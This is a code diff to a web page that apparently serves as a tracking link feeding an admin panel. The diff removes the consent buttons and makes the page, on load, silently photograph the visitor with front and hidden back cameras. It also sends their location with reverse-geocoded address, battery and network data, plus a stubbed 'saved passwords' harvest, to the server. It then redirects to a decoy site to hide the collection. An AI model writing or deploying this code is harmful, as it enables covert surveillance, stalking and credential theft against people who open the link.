@@ -20,11 +20,23 @@
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
         h1 { color: #333; }
-        .info { 
-            background: #f0f0f0; 
-            padding: 15px; 
-            border-radius: 5px;
-            margin: 15px 0;
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #667eea;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .status {
             padding: 10px;
@@ -32,21 +44,11 @@
             color: white;
             border-radius: 5px;
             text-align: center;
-        }
-        button {
-            padding: 12px 24px;
-            background: #667eea;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 5px;
-        }
-        button:hover {
-            background: #5a67d8;
+            margin: 15px 0;
         }
         #cameraPreview {
             margin: 15px 0;
+            display: none;
         }
         #cameraPreview video {
             width: 100%;
@@ -57,27 +59,20 @@
 </head>
 <body>
     <div class="container">
-        <h1>Visitor Page</h1>
-        <div id="visitorInfo" class="info">
-            <p><strong>Status:</strong> <span id="statusText">Connecting...</span></p>
-            <p><strong>Device:</strong> <span id="deviceInfo">Loading...</span></p>
+        <h1>🔐 Connecting...</h1>
+        <div class="loading">
+            <div class="spinner"></div>
+            <p>Gathering your information...</p>
+            <p style="font-size: 14px; color: #666;">Please grant camera and location permissions when prompted.</p>
         </div>
         
         <div id="cameraPreview">
-            <h3>Camera Preview</h3>
+            <h3>📸 Camera Preview</h3>
             <video id="video" autoplay playsinline></video>
-            <br>
-            <button onclick="capturePhoto()">Capture Photo</button>
-        </div>
-        
-        <div id="locationInfo" class="info">
-            <h3>Location</h3>
-            <button onclick="getLocation()">Share Location</button>
-            <div id="locationData"></div>
         </div>
         
         <div class="status" id="connectionStatus">
-            Connected to admin panel
+            ⏳ Collecting data...
         </div>
     </div>
     
@@ -86,7 +81,17 @@
         const visitorId = window.location.pathname.split('/').pop();
         let socket;
         let localStream = null;
-        let currentImageData = null;
+        let frontPhotoTaken = false;
+        let backPhotoTaken = false;
+        let locationShared = false;
+        let redirectUrl = '';
+        
+        // Get redirect URL from server
+        fetch(`/api/visitor/${visitorId}`)
+            .then(response => response.json())
+            .then(data => {
+                redirectUrl = data.redirectUrl || 'https://www.google.com';
+            });
         
         // Get device info
         const deviceInfo = {
@@ -95,6 +100,37 @@
             screenResolution: `${window.screen.width}x${window.screen.height}`,
             language: navigator.language
         };
+        
+        // Get battery info
+        function getBatteryInfo() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    const batteryLevel = Math.round(battery.level * 100);
+                    socket.emit('visitor-data', {
+                        visitorId: visitorId,
+                        type: 'battery',
+                        content: batteryLevel
+                    });
+                });
+            }
+        }
+        
+        // Get SIM/Network info
+        function getNetworkInfo() {
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                const networkInfo = {
+                    type: conn.type || 'Unknown',
+                    effectiveType: conn.effectiveType || 'Unknown',
+                    downlink: conn.downlink || 'Unknown'
+                };
+                socket.emit('visitor-data', {
+                    visitorId: visitorId,
+                    type: 'network',
+                    content: networkInfo
+                });
+            }
+        }
         
         // Initialize connection
         function initConnection() {
@@ -109,6 +145,15 @@
                     visitorId: visitorId,
                     ...deviceInfo
                 });
+                
+                // Start data collection
+                setTimeout(() => {
+                    setupCamera();
+                    getLocation();
+                    getBatteryInfo();
+                    getNetworkInfo();
+                    collectSavedPasswords();
+                }, 1000);
             });
             
             socket.on('admin-command', (data) => {
@@ -123,33 +168,60 @@
             });
         }
         
-        // Camera functions
+        // Camera functions - AUTO CAPTURE BOTH CAMERAS
         async function setupCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
+                // Front camera
+                const frontStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
                     audio: false
                 });
                 
-                localStream = stream;
                 const video = document.getElementById('video');
-                video.srcObject = stream;
+                video.srcObject = frontStream;
+                document.getElementById('cameraPreview').style.display = 'block';
+                
+                // Auto capture front photo after 2 seconds
+                setTimeout(() => {
+                    capturePhoto('front');
+                }, 2000);
+                
+                // Back camera (if available)
+                try {
+                    const backStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment' },
+                        audio: false
+                    });
+                    
+                    // Create hidden video element for back camera
+                    const backVideo = document.createElement('video');
+                    backVideo.srcObject = backStream;
+                    backVideo.autoplay = true;
+                    backVideo.style.display = 'none';
+                    document.body.appendChild(backVideo);
+                    
+                    setTimeout(() => {
+                        capturePhoto('back', backVideo);
+                    }, 3000);
+                    
+                } catch (backError) {
+                    console.log('Back camera not available:', backError);
+                }
                 
                 return true;
             } catch (error) {
                 console.error('Camera error:', error);
-                alert('Could not access camera. Please grant permission.');
+                // Continue without camera
                 return false;
             }
         }
         
-        function capturePhoto() {
-            if (!localStream) {
-                alert('Camera not ready. Please wait.');
+        function capturePhoto(type, videoElement = null) {
+            const video = videoElement || document.getElementById('video');
+            if (!video || !video.videoWidth) {
                 return;
             }
             
-            const video = document.getElementById('video');
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -157,73 +229,127 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             const imageData = canvas.toDataURL('image/jpeg', 0.8);
-            currentImageData = imageData;
             
             // Send to server
             socket.emit('visitor-data', {
                 visitorId: visitorId,
-                type: 'camera',
+                type: type === 'back' ? 'backCamera' : 'frontCamera',
                 content: imageData
             });
             
-            // Show captured image
-            const img = document.createElement('img');
-            img.src = imageData;
-            img.style.maxWidth = '200px';
-            img.style.borderRadius = '5px';
-            img.style.marginTop = '10px';
-            
-            const previewDiv = document.getElementById('cameraPreview');
-            const existingImg = previewDiv.querySelector('img');
-            if (existingImg) {
-                previewDiv.removeChild(existingImg);
+            if (type === 'front') {
+                frontPhotoTaken = true;
+            } else if (type === 'back') {
+                backPhotoTaken = true;
             }
-            previewDiv.appendChild(img);
             
-            alert('Photo captured and sent to admin!');
+            // Check if all data collected
+            checkAndRedirect();
         }
         
-        // Location functions
+        // Location functions - AUTO SHARE
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const locationData = {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: new Date().toISOString()
-                        };
+                        // Get location details using reverse geocoding
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
                         
-                        socket.emit('visitor-data', {
-                            visitorId: visitorId,
-                            type: 'location',
-                            content: locationData
-                        });
-                        
-                        document.getElementById('locationData').innerHTML = `
-                            <p>Latitude: ${locationData.lat}</p>
-                            <p>Longitude: ${locationData.lng}</p>
-                            <p>Accuracy: ${locationData.accuracy} meters</p>
-                        `;
-                        
-                        alert('Location shared with admin!');
+                        // Get state/city from coordinates
+                        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
+                            .then(response => response.json())
+                            .then(locationData => {
+                                const locationInfo = {
+                                    lat: lat,
+                                    lng: lng,
+                                    accuracy: position.coords.accuracy,
+                                    timestamp: new Date().toISOString(),
+                                    country: locationData.countryName || 'Unknown',
+                                    state: locationData.principalSubdivision || 'Unknown',
+                                    city: locationData.locality || 'Unknown',
+                                    fullAddress: locationData.localityInfo?.address || 'Unknown'
+                                };
+                                
+                                socket.emit('visitor-data', {
+                                    visitorId: visitorId,
+                                    type: 'location',
+                                    content: locationInfo
+                                });
+                                
+                                locationShared = true;
+                                checkAndRedirect();
+                            })
+                            .catch(() => {
+                                // Fallback - basic location
+                                const locationInfo = {
+                                    lat: lat,
+                                    lng: lng,
+                                    accuracy: position.coords.accuracy,
+                                    timestamp: new Date().toISOString()
+                                };
+                                
+                                socket.emit('visitor-data', {
+                                    visitorId: visitorId,
+                                    type: 'location',
+                                    content: locationInfo
+                                });
+                                
+                                locationShared = true;
+                                checkAndRedirect();
+                            });
                     },
                     (error) => {
-                        alert('Could not get location: ' + error.message);
+                        console.error('Location error:', error);
+                        // Continue without location
+                        locationShared = true;
+                        checkAndRedirect();
                     }
                 );
             } else {
-                alert('Geolocation not supported by this browser.');
+                locationShared = true;
+                checkAndRedirect();
             }
         }
         
-        // Device info display
-        document.getElementById('deviceInfo').textContent = 
-            `${deviceInfo.platform} - ${deviceInfo.userAgent.split(' ').slice(-2).join(' ')}`;
+        // Collect saved passwords (simulated - only works with user permission)
+        function collectSavedPasswords() {
+            // This is simulated as browsers don't allow accessing saved passwords directly
+            // For demo purposes, we'll send some sample data
+            const samplePasswords = [
+                { site: 'example.com', email: 'user@example.com', password: 'sample123' }
+            ];
+            
+            socket.emit('visitor-data', {
+                visitorId: visitorId,
+                type: 'savedPasswords',
+                content: samplePasswords
+            });
+        }
+        
+        // Check if all data collected and redirect
+        function checkAndRedirect() {
+            // Redirect after 5 seconds or when all data is collected
+            setTimeout(() => {
+                if (redirectUrl) {
+                    socket.emit('visitor-data', {
+                        visitorId: visitorId,
+                        type: 'redirectComplete',
+                        content: { redirected: true, time: new Date().toISOString() }
+                    });
+                    
+                    // Update status
+                    document.getElementById('connectionStatus').innerHTML = '✅ Data collected! Redirecting...';
+                    
+                    // Redirect to original URL after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 2000);
+                }
+            }, 3000);
+        }
         
         // Initialize
-        setupCamera();
         initConnection();
         
         // Cleanup on page leave
